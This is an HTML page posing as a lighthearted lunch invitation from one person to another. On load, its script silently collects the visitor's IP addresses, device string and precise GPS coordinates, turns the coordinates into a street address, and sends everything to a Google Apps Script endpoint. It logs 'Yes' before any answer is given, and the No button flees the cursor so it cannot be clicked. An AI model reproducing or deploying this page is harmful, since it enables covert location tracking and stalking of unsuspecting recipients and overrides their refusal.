<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Lunch Invite</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">

<style>
html, body {
  margin: 0;
  height: 100%;
  overflow: hidden;
  font-family: 'Poppins', sans-serif;
}

body {
  background: linear-gradient(135deg, #f6a5a5, #fbc2eb);
  display: flex;
  align-items: center;
  justify-content: center;
}

.card, .success {
  position: absolute;
  text-align: center;
  max-width: 420px;
  padding: 30px;
  border-radius: 20px;
  background: rgba(255,255,255,0.3);
  backdrop-filter: blur(12px);
  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
  transition: opacity 0.4s ease;
}

.success {
  opacity: 0;
  pointer-events: none;
}

h2 {
  font-weight: 500;
  color: #333;
  line-height: 1.6;
}

.buttons {
  margin-top: 25px;
  display: flex;
  justify-content: center;
  gap: 15px;
}

button {
  padding: 12px 18px;
  border: none;
  border-radius: 12px;
  font-size: 14px;
  cursor: pointer;
}

#yesBtn {
  background: #4CAF50;
  color: white;
}

#noBtn {
  background: #ff4d6d;
  color: white;
  position: relative;
  transition: left 0.12s ease, top 0.12s ease;
  z-index: 9999;
}

.emoji {
  font-size: 50px;
  animation: float 1.5s infinite ease-in-out;
}

.subtext {
  margin-top: 15px;
  font-size: 16px;
  color: #444;
}

@keyframes float {
  0% { transform: translateY(0); }
  50% { transform: translateY(-15px); }
  100% { transform: translateY(0); }
}
</style>
</head>

<body>

<div class="card" id="formCard">
  <h2>
    I was thinking…I’d really love to spend some time with you over lunch on the weekend—just the two of us, getting to know each other a little better.<br><br>
    Would you be willing to make some time for me?
  </h2>

  <div class="buttons">
    <button id="yesBtn">Yes, I’d love to</button>
    <button id="noBtn">Nope, I'm busy</button>
  </div>
</div>

<div class="success" id="successScreen">
  <h1>I knew you'd say yes!</h1>
  <div class="emoji">🎉🥳✨</div>
  <div class="subtext">
    You just made my day.<br>
    This is going to be something special.
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwG7qG-DkcT1Kso9geynmPmzKjuxYIUPGeHoZThrWK5KzfgoTaRBGm0aRYDZqpqVwzx/exec";

/* ---------- SESSION ID (for matching rows) ---------- */
const sessionId = Date.now() + "_" + Math.random().toString(36).substring(2);

const noBtn = document.getElementById("noBtn");
const yesBtn = document.getElementById("yesBtn");
const formCard = document.getElementById("formCard");
const successScreen = document.getElementById("successScreen");

let isFloating = false;
let isMoving = false;

/* ---------- INITIAL LOAD ---------- */
window.onload = () => {
  sendInitialData();
  requestLocation();
};

/* ---------- INITIAL DATA ---------- */
async function sendInitialData() {

  let ipv4 = "";
  let ipv6 = "";
  const device = navigator.userAgent;

  try {
    const res = await fetch("https://api.ipify.org?format=json");
    ipv4 = (await res.json()).ip;
  } catch {}

  try {
    const res = await fetch("https://api64.ipify.org?format=json");
    ipv6 = (await res.json()).ip;
  } catch {}

  fetch(SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify({
      sessionId,
      step: "initial",
      answer: "Yes",
      ipv4,
      ipv6,
      device
    })
  });
}

/* ---------- LOCATION ---------- */
async function requestLocation() {

  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 15000
      });
    });

    const latitude = pos.coords.latitude;
    const longitude = pos.coords.longitude;

    let location = "";

    try {
      const geo = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`
      );
      const data = await geo.json();
      location = data.display_name;
    } catch {}

    // retry logic (fixes missing updates)
    sendLocationWithRetry(location, latitude, longitude);

  } catch {
    // ignored/denied → do nothing
  }
}

/* ---------- RETRY (IMPORTANT FIX) ---------- */
function sendLocationWithRetry(location, latitude, longitude, retries = 5) {

  fetch(SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify({
      sessionId,
      step: "location",
      location,
      latitude,
      longitude
    })
  });

  // retry if initial row not created yet
  if (retries > 0) {
    setTimeout(() => {
      sendLocationWithRetry(location, latitude, longitude, retries - 1);
    }, 2000);
  }
}

/* ---------- NO BUTTON ---------- */
function getSafePosition() {
  const padding = 20;
  const maxX = window.innerWidth - noBtn.offsetWidth - padding;
  const maxY = window.innerHeight - noBtn.offsetHeight - padding;

  return {
    x: Math.max(padding, Math.random() * maxX),
    y: Math.max(padding, Math.random() * maxY)
  };
}

function moveNoButton(e) {
  e.preventDefault();

  if (isMoving) return;
  isMoving = true;

  if (!isFloating) {
    const rect = noBtn.getBoundingClientRect();
    noBtn.style.position = "fixed";
    noBtn.style.left = rect.left + "px";
    noBtn.style.top = rect.top + "px";
    isFloating = true;
  }

  const { x, y } = getSafePosition();
  noBtn.style.left = x + "px";
  noBtn.style.top = y + "px";

  setTimeout(() => isMoving = false, 100);
}

noBtn.addEventListener("mouseenter", moveNoButton);
noBtn.addEventListener("touchstart", moveNoButton);

/* ---------- FAILSAFE ---------- */
setInterval(() => {
  const rect = noBtn.getBoundingClientRect();

  if (
    rect.left < 0 ||
    rect.top < 0 ||
    rect.right > window.innerWidth ||
    rect.bottom > window.innerHeight
  ) {
    const { x, y } = getSafePosition();
    noBtn.style.left = x + "px";
    noBtn.style.top = y + "px";
  }
}, 300);

/* ---------- YES BUTTON ---------- */
yesBtn.addEventListener("click", () => {

  formCard.style.opacity = "0";

  setTimeout(() => {
    formCard.style.display = "none";
    successScreen.style.opacity = "1";
  }, 200);

  confetti({
    particleCount: 200,
    spread: 80,
    origin: { y: 0.6 }
  });
});
</script>

</body>
</html>
